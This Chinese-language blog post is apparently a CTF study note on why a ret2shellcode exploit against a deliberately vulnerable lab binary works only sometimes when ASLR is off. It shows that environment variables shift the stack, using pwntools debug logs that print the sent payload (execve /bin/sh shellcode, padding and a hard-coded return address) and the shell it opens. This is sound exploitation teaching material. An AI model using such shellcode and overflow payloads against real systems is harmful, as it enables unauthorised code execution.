# ASLR保护关闭情况下环境变量对栈地址的影响


## 无法复现的ret2shellcode

今天在尝试复现[一步一步学ROP之linux_x86篇 蒸米](https://www.vuln.cn/6645)时第一个ret2shellcode时遇到了问题

题目本身比较简单，由于关闭了NX保护，栈有了执行权限。也关闭了ASLR保护，关闭了地址随机化。故直接在输入时塞一段shellcode，然后覆盖返回地址，使eip跳转到shellcode开头进行执行，即可getshell。但最大的问题在于如何获取shellcode的起始地址（即栈上的一个地址）。

如果我们直接用gdb去调试可执行程序，得到栈上的地址，覆盖返回地址进行栈溢出攻击，会发现无法成功。原文中作者这样解释道：

> 原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。

为了解决这个问题，作者建议我们开启`core dump`之后再执行./level1，同时输入足够溢出长度的字符串使程序崩溃，然后用gdb载入生成的core dump文件，从而获取到执行过程中的栈上地址。

然而，经过尝试，使用core dump的地址覆盖返回地址进行攻击同样会失败。经过更多的尝试，多次进行core dump得到的地址并不一样，多次进行gdb直接调试得到的栈上地址也不相同，在不同的终端中进行得到的地址也可能不同。

唯一可行的办法是在exp中把gdb attach上去进行调试，得到的地址可以成功完成攻击，得到shell。但是，在不同终端中同样的脚本仍可能会失败。

似乎栈地址仍是随机化的，还有什么因素在影响栈地址吗？

## 环境变量悄悄作祟

最终找到了stack overflow上的一篇[回答](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)，第一个回答中作者的配图如下：

![Process layout](https://i.stack.imgur.com/N4rzh.png)

原来，操作系统在加载程序时会将`环境变量`和`程序参数`放在栈地址之前。于是，在不同环境变量的环境中栈的起始地址是不一样的（已关闭ASLR情况下），栈上内容的地址自然也不一样。

对此，我们可以做个简单的实验验证一下：

注：以下使用的是`fish shell`，`set -x`和`set -e`分别是fish中设置/取消环境变量的语法

```shell
  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                                 pwn 16:51:00
❯ python exp1.py    # 第一次执行攻击脚本
[+] Starting local process './level1' argv=[b'./level1'] : pid 116511
[DEBUG] Sent 0x90 bytes:
    00000000  31 c9 f7 e1  51 68 2f 2f  73 68 68 2f  62 69 6e 89  │1···│Qh//│shh/│bin·│
    00000010  e3 b0 0b cd  80 61 61 61  61 61 61 61  61 61 61 61  │····│·aaa│aaaa│aaaa│
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  61 61 61 61  61 61 61 61  61 61 61 61  b0 d4 ff ff  │aaaa│aaaa│aaaa│····│
    00000090
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:        # 能够正常get shell并执行命令
    b'ls\n'
[DEBUG] Received 0x45 bytes:
    b'exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz\n'
exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz
$ 
[*] Stopped process './level1' (pid 116511)
  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                            5s  pwn 16:51:13
❯ set -x var 123        # 添加一个环境变量 var = 123
  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                                 pwn 16:51:27
❯ python exp1.py        # 第二次执行攻击脚本（添加环境变量后）
[+] Starting local process './level1' argv=[b'./level1'] : pid 116661
[DEBUG] Sent 0x90 bytes:
    00000000  31 c9 f7 e1  51 68 2f 2f  73 68 68 2f  62 69 6e 89  │1···│Qh//│shh/│bin·│
    00000010  e3 b0 0b cd  80 61 61 61  61 61 61 61  61 61 61 61  │····│·aaa│aaaa│aaaa│
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  61 61 61 61  61 61 61 61  61 61 61 61  b0 d4 ff ff  │aaaa│aaaa│aaaa│····│
    00000090
[*] Switching to interactive mode
[*] Got EOF while reading in interactive # get shell失败
$ 
[*] Process './level1' stopped with exit code -11 (SIGSEGV) (pid 116661)
  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                            3s  pwn 16:51:35
❯ set -e var        # 删除设置的环境变量var
  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                                 pwn 16:51:50
❯ python exp1.py    # 第三次执行攻击脚本
[+] Starting local process './level1' argv=[b'./level1'] : pid 116805
[DEBUG] Sent 0x90 bytes:
    00000000  31 c9 f7 e1  51 68 2f 2f  73 68 68 2f  62 69 6e 89  │1···│Qh//│shh/│bin·│
    00000010  e3 b0 0b cd  80 61 61 61  61 61 61 61  61 61 61 61  │····│·aaa│aaaa│aaaa│
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  61 61 61 61  61 61 61 61  61 61 61 61  b0 d4 ff ff  │aaaa│aaaa│aaaa│····│
    00000090
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:    # 可正常get shell并执行命令
    b'ls\n'
[DEBUG] Received 0x45 bytes:
    b'exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz\n'
exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz
```

可以发现，原本可以攻击成功的脚本在添加一个无关紧要的环境变量之后无法完成攻击。而在删除这个变量之后，脚本又能成功get shell。可见环境变量确实对栈地址有影响。

## 题外话

搞清楚以上问题之后，笔者忽然想起了前段时间做过的`MIT 6.858`的一个[lab](http://css.csail.mit.edu/6.858/2022/labs/lab1.html)，其中给出了一个`clean-env.sh`。当时还没有重视，现在想起来，和这里的原理也是一样的。还是得赞叹一下这个lab设计的严谨。

相比之下，笔者还没有找到给出正确解释中文资料，反倒是有不少将错就错、不求甚解的存在。

